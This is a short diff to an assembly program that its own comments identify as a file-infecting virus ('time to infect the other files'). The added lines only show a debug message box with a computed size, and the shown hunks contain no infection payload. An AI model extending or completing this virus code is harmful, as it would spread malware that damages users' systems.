@@ -22,7 +22,10 @@ begin_copy:
 ; �������������������������������������������������������������������������
 ; DATA (inside .code section)
 ; �������������������������������������������������������������������������
-    msgCaption db "Hello", 0
+    mycode_len DWORD 0 
+buffer_mycode_len db 256 dup(0)
+format_l db "File size: %d", 0
+     msgCaption db "Hello", 0
     msgOfVictory        db "H4 h4 h4, J3 5u15 1 H4CK3R !!!", 0
     msgText db "Hello, World!", 0
     kernel32_dll_name db "kernel32.dll", 0
@@ -316,6 +319,12 @@ ENDM
 ; functions loading end.
 
     next:
+     lea ecx,dword ptr [mycode_len]
+      mov dword ptr [ecx],6
+      sub dword ptr [ecx],2
+    invoke wsprintf, addr buffer_mycode_len, addr format_l, mycode_len
+    invoke MessageBoxA, NULL, addr buffer_mycode_len, addr msgCaption, MB_OK
+
     invoke MessageBox, NULL, addr msgOfVictory, addr msgOfVictory, MB_OK
 ; --------------------------------------> Now, time to infect the other files ! Niark niark niark...
     ;mov ecx,win32finddata              ; Load address of win32finddata into ECX
